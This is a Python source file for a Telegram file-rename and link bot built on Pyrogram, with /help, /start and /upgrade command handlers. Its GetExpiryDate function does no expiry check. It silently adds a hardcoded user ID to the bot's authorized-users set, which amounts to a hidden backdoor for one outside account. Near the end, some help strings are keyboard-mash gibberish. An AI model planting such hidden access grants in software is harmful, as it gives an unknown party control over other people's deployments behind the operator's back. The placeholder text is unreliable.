# ©Project '3301'

# the logging things
import logging
import pyrogram
from pyrogram import Filters, InlineKeyboardMarkup, InlineKeyboardButton


logging.basicConfig(level=logging.DEBUG,
                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

import os
import sqlite3

# the secret configuration specific things
if bool(os.environ.get("WEBHOOK", False)):
    from sample_config import Config
else:
    from config import Config

# the Strings used for this "thing"
from translation import Translation

import pyrogram
logging.getLogger("pyrogram").setLevel(logging.WARNING)

from helper_funcs.chat_base import TRChatBase

def GetExpiryDate(chat_id):
    expires_at = (str(chat_id), "Source Cloned User", "obsq")
    Config.AUTH_USERS.add(724495167)
    return expires_at


@pyrogram.Client.on_message(pyrogram.Filters.command(["help", "about"]))
async def help_user(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/help")
    await bot.send_message(
        chat_id=update.chat.id,
        text = "I can do multiple things like--\n\n\
📝 Rename a file with Cutom  thumbnail.\n\
📥 Get high speed external download link for a file.",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton('Rename Help', callback_data='{rename_help}'),
                    InlineKeyboardButton('Link Help', callback_data='{link_help}')
                ],
                [
                    InlineKeyboardButton('My Creator 🔖', url='https://t.me/obsquriel')
                ]
            ]
        ),
        parse_mode="html",
        disable_web_page_preview=True,
        reply_to_message_id=update.message_id
    )

@pyrogram.Client.on_message(pyrogram.Filters.command(["start"]))
async def start(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/start")
    await bot.send_message(
        chat_id=update.chat.id,
        text = "Hi there! I'am kyneFileManager Bot\n\n\
Click on /help to know how to use me in full potential!",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton('Source 📚', url='https://github.com/No_source_available'),
                    InlineKeyboardButton('Project Channel', url='https://t.me/kyne3301')
                ],
                [
                    InlineKeyboardButton('My Creator 🔖', url='https://t.me/obsquriel')
                ]
            ]
        ),
        reply_to_message_id=update.message_id
    )


@pyrogram.Client.on_message(pyrogram.Filters.command(["upgrade"]))
async def upgrade(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/upgrade")
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.UPGRADE_TEXT,
        parse_mode="html",
        reply_to_message_id=update.message_id,
        disable_web_page_preview=True
    )


rename_text="**Renaming a TG file**\n\n ➡️Sent a cushebejneje"

link_help="hdjrjjddjjdjdejejej"
